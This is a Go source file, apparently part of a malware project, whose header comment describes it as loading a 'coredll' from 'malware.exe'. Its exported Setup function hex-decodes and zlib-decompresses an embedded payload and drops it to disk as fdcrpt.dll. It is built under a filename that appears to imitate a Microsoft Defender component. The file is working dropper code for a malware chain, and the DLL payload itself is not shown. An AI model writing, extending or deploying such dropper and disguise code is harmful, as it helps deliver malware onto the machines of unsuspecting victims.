/*
Author: mzram
Date: 30/04/2023

Description:
Api para levantar el coredll desde el archivo malware.exe
*/

package main

import "C"
import (
	"bytes"
	"compress/zlib"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
)

// Compile this at: go build -buildmode=c-archive -o MpSet64HaskellUp.a setup.go

//export Setup
func Setup(coredll string) {

	// decode the data
	content := []byte(coredll)

	data_decode := make([]byte, hex.DecodedLen(len(content)))

	hex.Decode(data_decode, content)

	// Decompress the data (zlib decompress)
	r := bytes.NewReader(data_decode)
	data_stream, errReader := zlib.NewReader(r)
	if errReader != nil {
		panic("[ - ] Error when decompress the core dll with zlib Alght!")
	}
	defer data_stream.Close()

	data, _ := ioutil.ReadAll(data_stream)

	writer, err := os.Create("./fdcrpt.dll")
	if err != nil {
		panic("[ - ] Error when tried create DLL file")
	}

	defer writer.Close()
	fmt.Println("Data: ", len(data))
	_, errWR := writer.Write(data)
	if errWR != nil {
		panic("[ - ] Error when writing file" + errWR.Error())
	}

	fmt.Println("[ + ] Succefully! Have been create fdrcpt.dll file")

}

func main() {}
